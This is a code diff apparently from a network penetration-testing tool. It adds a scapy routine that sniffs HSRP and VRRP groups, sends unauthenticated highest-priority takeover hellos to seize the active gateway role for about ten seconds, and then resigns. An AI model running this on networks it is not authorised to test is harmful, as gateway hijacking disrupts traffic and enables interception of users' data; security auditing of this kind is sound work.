@@ -9,6 +9,7 @@ import csv
 import socket
 import struct
 import subprocess
+import time
 import logging
 from dataclasses import dataclass
 from typing import List
@@ -17,6 +18,8 @@ from scapy.all import *
 from scapy.layers.eap import EAPOL
 from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
 from scapy.layers.l2 import Ether, ARP
+from scapy.layers.hsrp import HSRP
+from scapy.layers.vrrp import VRRP, VRRPv3
 
 from ptnetinspector.entities.default_gw import DefaultGateway
 from ptnetinspector.utils.interface import Interface
@@ -108,6 +111,84 @@ class Send:
                 context="send-voice-phone",
                 retries=3,
                 retry_delay=0.05,
+                verbose=False,
+            )
+
+    @staticmethod
+    def send_fhrp_takeover(interface):
+        # Claim the active role in every gateway redundancy group heard on the
+        # port by sending an unauthenticated higher-priority hello, then step
+        # back down, so an unprotected group reveals it accepts the takeover.
+        exist_interface = Interface(interface).check_interface()
+        if not exist_interface:
+            return
+
+        src_mac = get_if_hwaddr(interface)
+        src_ip = get_if_addr(interface)
+
+        hsrp_groups = {}
+        vrrp_groups = {}
+
+        def collect(pkt):
+            if pkt.haslayer(HSRP):
+                layer = pkt[HSRP]
+                hsrp_groups[layer.group] = layer.virtualIP
+            elif pkt.haslayer(VRRP):
+                layer = pkt[VRRP]
+                version = 3 if pkt.haslayer(VRRPv3) else 2
+                address = layer.addrlist[0] if layer.addrlist else None
+                vrrp_groups[layer.vrid] = (address, version)
+
+        sniff(iface=interface, timeout=6, store=False, prn=collect,
+              filter="udp port 1985 or ip proto 112")
+
+        def hsrp_frame(group, virtual_ip, opcode, state, priority):
+            return (Ether(src=src_mac, dst="01:00:5e:00:00:02")
+                    / IP(src=src_ip, dst="224.0.0.2")
+                    / UDP(sport=1985, dport=1985)
+                    / HSRP(opcode=opcode, state=state, priority=priority,
+                           group=group, virtualIP=virtual_ip))
+
+        def vrrp_frame(vrid, address, version, priority):
+            body = VRRPv3 if version == 3 else VRRP
+            layer = body(vrid=vrid, priority=priority, ipcount=1, addrlist=[address])
+            return (Ether(src=src_mac, dst="01:00:5e:00:00:12")
+                    / IP(src=src_ip, dst="224.0.0.18", proto=112, ttl=255)
+                    / layer)
+
+        for _ in range(10):
+            for group, virtual_ip in hsrp_groups.items():
+                sendp_with_retries(
+                    packets=hsrp_frame(group, virtual_ip, 1, 16, 255),
+                    interface=interface, logger=logger,
+                    context="send-fhrp-hsrp-coup", retries=1, retry_delay=0.05,
+                    verbose=False,
+                )
+            for vrid, (address, version) in vrrp_groups.items():
+                if address is None:
+                    continue
+                sendp_with_retries(
+                    packets=vrrp_frame(vrid, address, version, 255),
+                    interface=interface, logger=logger,
+                    context="send-fhrp-vrrp-advert", retries=1, retry_delay=0.05,
+                    verbose=False,
+                )
+            time.sleep(1)
+
+        for group, virtual_ip in hsrp_groups.items():
+            sendp_with_retries(
+                packets=hsrp_frame(group, virtual_ip, 2, 0, 0),
+                interface=interface, logger=logger,
+                context="send-fhrp-hsrp-resign", retries=1, retry_delay=0.05,
+                verbose=False,
+            )
+        for vrid, (address, version) in vrrp_groups.items():
+            if address is None:
+                continue
+            sendp_with_retries(
+                packets=vrrp_frame(vrid, address, version, 0),
+                interface=interface, logger=logger,
+                context="send-fhrp-vrrp-resign", retries=1, retry_delay=0.05,
                 verbose=False,
             )
 
